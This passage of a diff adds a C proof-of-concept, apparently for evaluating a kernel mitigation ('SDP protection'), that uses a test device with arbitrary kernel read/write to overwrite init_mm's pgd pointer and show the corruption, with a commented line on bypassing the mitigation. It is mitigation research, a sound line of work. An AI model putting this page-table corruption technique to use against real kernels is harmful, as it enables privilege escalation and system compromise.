+    perror("arb_write");
+    exit(1);
+  }
+}
+
+int main(int argc, char *argv[]) {
+  printf("[+] init_mm.pgd Exploitation PoC\n\n");
+
+  if (argc != 4) {
+    printf("Usage: %s <mode> <init_mm_addr> <pgd_offset>\n", argv[0]);
+    printf("  mode: 0 (no protection), 1/2 (SDP protection)\n");
+    printf("  init_mm_addr: nm vmlinux | grep ' init_mm$' (mode 0)\n");
+    printf("                nm vmlinux | grep __init_mm_ptr (mode 1/2)\n");
+    printf("  pgd_offset: pahole -C mm_struct vmlinux | grep -A1 pgd\n");
+    printf("              or compare *(init_mm+offset) with swapper_pg_dir "
+           "addr\n");
+    return 1;
+  }
+
+  int fd = open("/dev/arb_rw", O_RDWR);
+  if (fd < 0) {
+    perror("open /dev/arb_rw");
+    return 1;
+  }
+  printf("[+] Opened /dev/arb_rw\n");
+
+  int mode = atoi(argv[1]);
+  unsigned long init_mm_addr = strtoul(argv[2], NULL, 16);
+  unsigned long pgd_offset = strtoul(argv[3], NULL, 0);
+
+  // For SDP protection mode, dereference the pointer first
+  if (mode != 0) {
+    unsigned long ptr_val;
+    arb_read(fd, init_mm_addr, &ptr_val, sizeof(ptr_val));
+    printf("[+] __init_mm_ptr at 0x%lx contains: 0x%lx\n", init_mm_addr,
+           ptr_val);
+    init_mm_addr = ptr_val;
+
+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
+    // correctly init_mm_addr = init_mm_addr | 0xFFFF000000000000;
+  }
+
+  printf("[+] init_mm address: 0x%lx\n", init_mm_addr);
+
+  // Calculate pgd field address
+  unsigned long pgd_addr = init_mm_addr + pgd_offset;
+  printf("[+] pgd field address: 0x%lx (init_mm + %lu)\n", pgd_addr,
+         pgd_offset);
+
+  // Read original pgd value (should be swapper_pg_dir)
+  unsigned long orig_pgd;
+  arb_read(fd, pgd_addr, &orig_pgd, sizeof(orig_pgd));
+  printf("[+] Original pgd value: 0x%lx (swapper_pg_dir)\n", orig_pgd);
+
+  // Read first entry at the original pgd location
+  unsigned long orig_entry;
+  arb_read(fd, orig_pgd, &orig_entry, sizeof(orig_entry));
+  printf("[+] Content at *pgd (original): 0x%lx\n", orig_entry);
+
+  // Corrupt pgd to point to init_mm itself (a known different and valid kernel address)
+  unsigned long corrupt_pgd = init_mm_addr;
+  printf("\n[+] Overwriting pgd to: 0x%lx (init_mm itself)\n", corrupt_pgd);
+  arb_write(fd, pgd_addr, &corrupt_pgd, sizeof(corrupt_pgd));
+
+  // Verify the write
+  unsigned long new_pgd;
+  arb_read(fd, pgd_addr, &new_pgd, sizeof(new_pgd));
+  printf("[+] New pgd value: 0x%lx\n", new_pgd);
+
+  // Read first entry via the corrupted pgd
+  unsigned long new_entry;
+  arb_read(fd, new_pgd, &new_entry, sizeof(new_entry));
+  printf("[+] Content at *pgd (after corruption): 0x%lx\n", new_entry);
+
+  // Show the manifestation
+  printf("\n[+] === MANIFESTATION ===\n");
+  if (orig_entry != new_entry) {
